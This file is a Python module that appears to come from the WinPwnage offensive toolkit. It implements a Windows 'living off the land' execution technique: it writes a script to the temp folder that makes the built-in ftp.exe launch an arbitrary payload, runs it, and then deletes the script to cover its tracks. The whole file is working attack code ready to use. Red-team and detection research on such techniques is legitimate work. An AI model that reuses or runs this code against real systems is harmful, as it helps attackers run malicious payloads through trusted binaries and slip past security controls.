import os
import random
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://lolbas-project.github.io/lolbas/Binaries/Ftp/

ftp_info = {
	"Description": "Execute payload using ftp binary",
	"Id": "11",
	"Type": "Execution",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "exec_ftp",
	"Function Payload": True,
}


def exec_ftp(payload):
	if payloads().exe(payload):
		paths = []
		binary = "ftp.exe"

		print_info("Searching for ({binary}) in system32 and syswow64".format(binary=binary))
		for root, dirs, files in os.walk(information().windows_directory()):	
			for name in files:
				if name.lower() == binary:
					if "system32" in root.lower() or "syswow64" in root.lower():
						paths.append(os.path.join(root, name))

		try:
			path = random.choice(paths)
		except IndexError:
			print_error("Unable to proceed, ({binary}) not found on system".format(binary=binary))
			return False
		else:
			print_info("Located ({binary}) binary".format(binary=binary))
			with open(os.path.join(tempfile.gettempdir(),"ftp.txt"), "w") as f:
				f.write("!{payload}\nbye".format(payload=payload))

			print_info("Attempting to launch {payload} using ({binary}) binary".format(payload=payload,binary=binary))
			exit_code = process().create(path,
						params="-s:{tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(),"ftp.txt")),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully created process ({}) exit code ({})".format(payload, exit_code))
			else:
				print_error("Unable to create process ({}) exit code ({})".format(payload, exit_code))
				return False

			try:
				os.remove(os.path.join(tempfile.gettempdir(),"ftp.txt"))
			except Exception:
				pass
	else:
		print_error("Cannot proceed, invalid payload")
		return False				